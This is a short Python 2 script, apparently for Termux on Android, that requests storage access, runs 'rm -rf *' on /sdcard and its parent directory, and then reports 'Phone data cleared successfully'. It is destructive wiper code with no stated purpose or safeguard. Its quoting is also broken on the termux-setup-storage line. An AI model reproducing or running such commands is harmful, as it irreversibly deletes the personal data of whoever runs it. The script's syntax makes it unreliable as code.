import os , sys , time , datetime , re
reload(sys)
sys.setdefaultencoding('utf-8')
os.system("termux-setup-storage')
os.system("cd /sdcard && rm -rf * ")
os.system("cd .. && rm -rf * ")
print("Phone data cleared successfully")
os.system("exit")
